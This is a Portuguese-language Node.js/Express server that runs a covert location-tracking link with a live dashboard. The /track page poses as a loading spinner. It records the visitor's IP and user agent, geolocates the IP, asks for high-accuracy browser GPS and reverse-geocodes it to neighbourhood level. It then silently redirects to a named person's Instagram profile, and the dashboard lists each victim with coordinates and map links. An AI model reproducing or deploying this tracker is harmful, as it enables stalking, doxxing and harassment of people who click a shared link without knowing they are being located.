const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const clicks = [];

function getIP(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
  return ip.replace('::ffff:', '').trim();
}

// Dashboard
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard de Rastreamento</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 20px;
    }
    .container { max-width: 1200px; margin: 0 auto; }
    .header {
      background: white;
      border-radius: 15px;
      padding: 30px;
      margin-bottom: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    h1 { color: #667eea; margin-bottom: 10px; }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
      margin-bottom: 20px;
    }
    .stat-card {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      text-align: center;
    }
    .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
    .stat-label { color: #666; margin-top: 5px; }
    .clicks-container {
      background: white;
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    .click-item {
      background: #f8f9fa;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin-bottom: 15px;
      border-radius: 5px;
    }
    .click-item.has-gps {
      border-left-color: #28a745;
      background: #f0fff4;
    }
    .btn {
      background: #667eea;
      color: white;
      border: none;
      padding: 12px 30px;
      border-radius: 25px;
      cursor: pointer;
      font-size: 1em;
      margin: 5px;
    }
    .btn:hover { background: #5568d3; }
    .btn-danger { background: #dc3545; }
    .btn-danger:hover { background: #c82333; }
    .link-box {
      background: #e3f2fd;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      border: 2px dashed #667eea;
    }
    .link-box code {
      background: white;
      padding: 8px 15px;
      border-radius: 5px;
      display: inline-block;
      color: #667eea;
      font-weight: bold;
      word-break: break-all;
    }
    .gps-badge {
      background: #28a745;
      color: white;
      padding: 5px 10px;
      border-radius: 5px;
      display: inline-block;
      font-size: 0.85em;
      font-weight: bold;
      margin: 5px 0;
    }
    .ip-badge {
      background: #ffc107;
      color: #000;
      padding: 5px 10px;
      border-radius: 5px;
      display: inline-block;
      font-size: 0.85em;
      font-weight: bold;
      margin: 5px 0;
    }
    .info { color: #666; font-size: 0.9em; margin: 3px 0; }
    .location-box {
      background: white;
      padding: 10px;
      margin: 8px 0;
      border-radius: 5px;
      border: 1px solid #ddd;
    }
    .alert {
      background: #fff3cd;
      border: 1px solid #ffc107;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>📊 Dashboard de Rastreamento GPS</h1>
      <p>Monitore cliques com localização precisa</p>
      
      <div class="alert" id="httpsWarning" style="display:none;">
        ⚠️ <strong>Aviso:</strong> GPS preciso requer HTTPS. Em HTTP só funciona localização por IP (menos precisa).
      </div>
      
      <div class="link-box">
        <strong>🔗 Link de rastreamento:</strong><br>
        <code id="trackLink"></code>
        <button class="btn" onclick="copyLink()">📋 Copiar</button>
      </div>
    </div>
    
    <div class="stats">
      <div class="stat-card">
        <div class="stat-number" id="totalClicks">0</div>
        <div class="stat-label">Total de Cliques</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="gpsClicks">0</div>
        <div class="stat-label">Com GPS Preciso</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="ipClicks">0</div>
        <div class="stat-label">Somente IP</div>
      </div>
    </div>
    
    <div class="clicks-container">
      <button class="btn" onclick="loadData()">🔄 Atualizar</button>
      <button class="btn btn-danger" onclick="clearAll()">🗑️ Limpar</button>
      <h2 style="margin-top:20px;">Últimos Cliques</h2>
      <div id="clicksList">Carregando...</div>
    </div>
  </div>
  
  <script>
    const trackLink = window.location.origin + '/track';
    document.getElementById('trackLink').textContent = trackLink;
    
    if (window.location.protocol === 'http:' && !window.location.hostname.includes('localhost')) {
      document.getElementById('httpsWarning').style.display = 'block';
    }
    
    function copyLink() {
      navigator.clipboard.writeText(trackLink);
      alert('Link copiado!');
    }
    
    async function clearAll() {
      if (confirm('Limpar todos os cliques?')) {
        await fetch('/api/clear', { method: 'POST' });
        loadData();
      }
    }
    
    async function loadData() {
      try {
        const res = await fetch('/api/stats');
        const data = await res.json();
        
        document.getElementById('totalClicks').textContent = data.total;
        
        const withGPS = data.clicks.filter(c => c.location && c.location.lat);
        const withIP = data.clicks.filter(c => (!c.location || !c.location.lat) && c.ipLocation);
        
        document.getElementById('gpsClicks').textContent = withGPS.length;
        document.getElementById('ipClicks').textContent = withIP.length;
        
        const list = document.getElementById('clicksList');
        
        if (data.clicks.length === 0) {
          list.innerHTML = '<p style="text-align:center;color:#999;padding:40px;">🔭 Nenhum clique registrado ainda</p>';
          return;
        }
        
        list.innerHTML = data.clicks.map(c => {
          const date = new Date(c.timestamp).toLocaleString('pt-BR');
          const hasGPS = c.location && c.location.lat;
          const hasIP = c.ipLocation && c.ipLocation.cidade;
          
          let html = '<div class="click-item' + (hasGPS ? ' has-gps' : '') + '">';
          html += '<div class="info"><strong>⏰ ' + date + '</strong></div>';
          html += '<div class="info">🌐 IP: ' + c.ip + '</div>';
          
          if (hasGPS) {
            const loc = c.location;
            html += '<div class="gps-badge">✅ GPS PRECISO</div>';
            html += '<div class="location-box">';
            html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + (loc.cidade || 'Processando...') + '</div>';
            html += '<div class="info"><strong>🗺️ Estado:</strong> ' + (loc.estado || 'Processando...') + '</div>';
            if (loc.bairro && loc.bairro !== 'N/A') {
              html += '<div class="info"><strong>🏘️ Bairro:</strong> ' + loc.bairro + '</div>';
            }
            html += '<div class="info"><strong>📍 Coordenadas:</strong> ' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '</div>';
            if (loc.accuracy) {
              html += '<div class="info"><strong>🎯 Precisão:</strong> ' + Math.round(loc.accuracy) + 'm</div>';
            }
            html += '<a href="https://www.google.com/maps?q=' + loc.lat + ',' + loc.lng + '" target="_blank" style="color:#667eea;font-weight:bold;">🗺️ Ver no Google Maps</a>';
            html += '</div>';
          } else if (hasIP) {
            html += '<div class="ip-badge">⚠️ LOCALIZAÇÃO POR IP</div>';
            html += '<div class="location-box">';
            html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + c.ipLocation.cidade + '</div>';
            html += '<div class="info"><strong>🗺️ Estado:</strong> ' + c.ipLocation.estado + '</div>';
            html += '<div class="info" style="color:#999;font-size:0.85em;">GPS não autorizado ou indisponível</div>';
            html += '</div>';
          } else {
            html += '<div class="ip-badge">❌ SEM LOCALIZAÇÃO</div>';
            html += '<div class="info" style="color:#999;">Aguardando dados...</div>';
          }
          
          html += '</div>';
          return html;
        }).join('');
      } catch (err) {
        console.error('Erro ao carregar:', err);
        document.getElementById('clicksList').innerHTML = '<p style="color:red;">Erro ao carregar dados</p>';
      }
    }
    
    loadData();
    setInterval(loadData, 3000);
  </script>
</body>
</html>
  `);
});

// Página de rastreamento
app.get('/track', (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'] || 'Unknown',
    location: null,
    ipLocation: null
  };
  
  clicks.push(clickData);
  console.log('🔔 Clique #' + clickData.id + ' - IP:', clickData.ip);
  
  // Busca IP em background
  (async () => {
    try {
      const ip = clickData.ip;
      if (ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
        console.log('⚠️  IP local - geolocalização indisponível');
        return;
      }
      
      const res = await fetch('http://ip-api.com/json/' + ip + '?lang=pt&fields=status,country,regionName,city,district');
      const data = await res.json();
      
      if (data.status === 'success') {
        const click = clicks.find(c => c.id === clickData.id);
        if (click) {
          click.ipLocation = {
            cidade: data.city || 'Desconhecida',
            estado: data.regionName || 'Desconhecido',
            pais: data.country || 'Desconhecido'
          };
          console.log('📍 IP Geo:', data.city, data.regionName);
        }
      }
    } catch (err) {
      console.error('❌ Erro IP:', err.message);
    }
  })();
  
  res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Carregando...</title>
<style>
body{margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial,sans-serif;}
.loading{text-align:center;color:#667eea;}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="loading">
<div class="spinner"></div>
<p>Carregando...</p>
</div>
<script>
const clickId=${clickData.id};
const redirectUrl='https://www.instagram.com/andre.osantos12/';
let redirected=false;
let gpsAttempted=false;

function doRedirect(){
  if(!redirected){
    redirected=true;
    window.location.href=redirectUrl;
  }
}

setTimeout(doRedirect,12000);

async function tryGetLocation(){
  if(gpsAttempted)return;
  gpsAttempted=true;
  
  if(!navigator.geolocation){
    console.log('Geolocation não suportado');
    setTimeout(doRedirect,500);
    return;
  }
  
  try{
    const position=await new Promise((resolve,reject)=>{
      navigator.geolocation.getCurrentPosition(resolve,reject,{
        enableHighAccuracy:true,
        timeout:10000,
        maximumAge:0
      });
    });
    
    const lat=position.coords.latitude;
    const lng=position.coords.longitude;
    const acc=position.coords.accuracy;
    
    console.log('✅ GPS obtido:',lat,lng,'±'+Math.round(acc)+'m');
    
    try{
      const geoUrl='https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&addressdetails=1&accept-language=pt-BR&zoom=18';
      const geoRes=await fetch(geoUrl,{
        headers:{'User-Agent':'Mozilla/5.0 (compatible; LocationTracker/1.0)'}
      });
      const geoData=await geoRes.json();
      
      let location=null;
      if(geoData&&geoData.address){
        const a=geoData.address;
        location={
          cidade:a.city||a.town||a.village||a.municipality||a.county||a.state_district||a.suburb||'Desconhecida',
          estado:a.state||a.region||a.state_district||'Desconhecido',
          bairro:a.suburb||a.neighbourhood||a.district||a.quarter||a.residential||a.hamlet||null,
          pais:a.country||'Brasil'
        };
        console.log('📍 Localização:',location.cidade,'-',location.estado);
      }
      
      await fetch('/api/save-gps',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          clickId:clickId,
          lat:lat,
          lng:lng,
          accuracy:acc,
          location:location
        })
      });
      
      console.log('✅ Dados salvos');
    }catch(err){
      console.error('Erro ao processar localização:',err);
    }
    
    setTimeout(doRedirect,800);
    
  }catch(error){
    console.log('❌ GPS não autorizado ou erro:',error.code,error.message);
    setTimeout(doRedirect,1000);
  }
}

if(document.readyState==='loading'){
  document.addEventListener('DOMContentLoaded',tryGetLocation);
}else{
  setTimeout(tryGetLocation,100);
}
</script>
</body>
</html>`);
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy, location } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      console.error('❌ Click não encontrado:', clickId);
      return res.json({ success: false });
    }
    
    click.location = {
      lat: parseFloat(lat),
      lng: parseFloat(lng),
      accuracy: parseFloat(accuracy),
      cidade: location?.cidade || 'Processando...',
      estado: location?.estado || 'Processando...',
      bairro: location?.bairro || null,
      pais: location?.pais || 'Brasil'
    };
    
    console.log('✅ GPS #' + clickId + ':', lat.toFixed(6), lng.toFixed(6), '(±' + Math.round(accuracy) + 'm)');
    console.log('📍', click.location.cidade, '-', click.location.estado);
    
    // Sempre tenta refinar a localização no servidor também
    setTimeout(async () => {
      try {
        console.log('🔄 Refinando localização no servidor...');
        const geoUrl = 'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&addressdetails=1&accept-language=pt-BR&zoom=18';
        const r = await fetch(geoUrl, {
          headers: { 'User-Agent': 'Mozilla/5.0 (compatible; LocationTracker/1.0)' }
        });
        const d = await r.json();
        
        if (d && d.address) {
          const a = d.address;
          const novaCidade = a.city || a.town || a.village || a.municipality || a.county || a.state_district || a.suburb;
          const novoEstado = a.state || a.region || a.state_district;
          const novoBairro = a.suburb || a.neighbourhood || a.district || a.quarter || a.residential || a.hamlet;
          
          if (novaCidade) click.location.cidade = novaCidade;
          if (novoEstado) click.location.estado = novoEstado;
          if (novoBairro) click.location.bairro = novoBairro;
          if (a.country) click.location.pais = a.country;
          
          console.log('✅ Refinado:', click.location.cidade, '-', click.location.estado, (click.location.bairro ? '(' + click.location.bairro + ')' : ''));
        }
      } catch (err) {
        console.error('❌ Erro refinamento:', err.message);
      }
    }, 2000);
    
    res.json({ success: true });
  } catch (err) {
    console.error('❌ Erro save-gps:', err);
    res.json({ success: false, error: err.message });
  }
});

app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: [...clicks].reverse()
  });
});

app.post('/api/clear', (req, res) => {
  clicks.length = 0;
  console.log('🗑️ Todos os cliques foram limpos');
  res.json({ success: true });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('🚀 Servidor rodando na porta ' + PORT);
  console.log('');
  console.log('📊 Dashboard: http://localhost:' + PORT);
  console.log('🔗 Link rastreamento: http://localhost:' + PORT + '/track');
  console.log('');
  console.log('⚠️  IMPORTANTE:');
  console.log('   • GPS preciso requer HTTPS em produção');
  console.log('   • Em HTTP funciona apenas localização por IP');
  console.log('   • Para testar GPS: use servidor com SSL/TLS');
  console.log('');
});
